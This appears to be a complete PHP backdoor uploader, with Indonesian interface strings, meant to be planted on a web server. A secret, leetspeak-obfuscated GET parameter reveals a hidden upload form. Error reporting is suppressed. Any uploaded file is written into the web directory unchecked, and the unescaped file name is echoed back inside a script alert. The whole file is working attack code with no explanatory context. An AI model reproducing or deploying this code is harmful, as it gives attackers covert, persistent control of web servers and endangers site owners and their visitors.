<?php
//Upload GET= upl0@d=0p3n Fungsi= uPL0AdF1l3()
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
function uPL0AdF1l3(){if($_GET['upl0@d']=='0p3n'){echo"<center><form action='' method='post' enctype='multipart/form-data'><input type='file' name='m_upload'><input type='submit' name='uploadBerkas' value='Upload'></form></center>";$target_file=basename($_FILES["m_upload"]["name"]);if(isset($_POST["uploadBerkas"])){$target_file= basename($_FILES["m_upload"]["name"]);if(move_uploaded_file($_FILES["m_upload"]["tmp_name"], $target_file)){echo"<script>alert('Berhasil')</script>";echo"<script>alert('$target_file')</script>";}else{echo"<script>alert('Gagal')</script>";}}}}
uPL0AdF1l3();
?>